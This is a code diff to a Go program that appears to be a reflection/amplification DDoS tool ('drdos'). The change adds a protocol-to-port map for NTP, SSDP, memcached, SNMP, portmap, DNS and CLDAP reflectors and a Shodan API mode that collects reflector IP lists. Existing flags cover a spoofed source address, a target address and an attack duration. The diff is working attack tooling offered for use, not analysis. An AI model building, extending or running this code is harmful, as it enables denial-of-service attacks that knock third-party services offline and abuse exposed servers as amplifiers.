@@ -6,11 +6,28 @@ import (
 	"net"
 	"strings"
 
+	// "reflect"
+
 	"drdos/config"
 	"drdos/core"
+	"drdos/core/api"
 	"drdos/plugins"
 	"drdos/utils"
 )
+
+var typemap map[string]int
+
+func init() {
+	typemap = map[string]int{
+		"ntp":       123,
+		"ssdp":      1900,
+		"memcached": 11211,
+		"snmp":      161,
+		"portmap":   111,
+		"dns":       53,
+		"cldap":     389,
+	}
+}
 
 func modeWarn() {
 	fmt.Println("[!] Mode must be set !")
@@ -42,6 +59,7 @@ func main() {
 		outputfile string // 输出的IP列表
 		timeout    uint   // 攻击时间超时
 		iprange    string // 手动输入的IP范围
+		apiquery   bool   // api模式
 	)
 
 	flag.StringVar(&mode, "m", "", "c(check)|a(attack)|m(mix mode)")
@@ -54,6 +72,7 @@ func main() {
 	flag.StringVar(&outputfile, "o", "", "Output file path")
 	flag.UintVar(&timeout, "timeout", 120, "Attack time")
 	flag.StringVar(&iprange, "range", "", "IP range")
+	flag.BoolVar(&apiquery, "api", false, "Get IP list from api")
 	flag.Parse()
 
 	// 黑名单校验
@@ -81,19 +100,14 @@ func main() {
 			return
 		}
 
-		if iprange == "" {
-			if loadfile != "" {
-				fmt.Println("[+] Loadfile from " + loadfile)
-				iplist, err = utils.FileLoads(loadfile)
-				if err != nil {
-					return
-				}
-			} else {
-				fmt.Println("[-] Please set loadfile")
-				usage()
+		switch {
+		case loadfile != "":
+			fmt.Println("[+] Loadfile from " + loadfile)
+			iplist, err = utils.FileLoads(loadfile)
+			if err != nil {
 				return
 			}
-		} else {
+		case iprange != "":
 			if strings.Contains(iprange, "/") {
 				iplist, err = utils.Hosts(iprange)
 				if err != nil {
@@ -108,6 +122,20 @@ func main() {
 				}
 				iplist = []string{iprange}
 			}
+		case apiquery:
+			fmt.Println("[*] Shodan API Searching")
+			for page := 1; page <= config.ShodanPage; page++ {
+				tmplist, err := api.Shodan(typemap[atktype], uint(page))
+				if err != nil {
+					break
+				}
+				iplist = append(iplist, tmplist...)
+			}
+			fmt.Println("[+] Shodan API Searching Finished")
+
+		default:
+			fmt.Println("[-] Error Input")
+			return
 		}
 
 		_, err = core.Check(iplist, atktype, outputfile, interval, srcaddress)
@@ -121,6 +149,7 @@ func main() {
 		if ipaddress == "" || atktype == "" || loadfile == "" {
 			fmt.Println("[-] Input error!")
 			usage()
+			return
 		}
 		if port > 65535 || port <= 0 {
 			fmt.Println("[-] Port in range 1~65535")
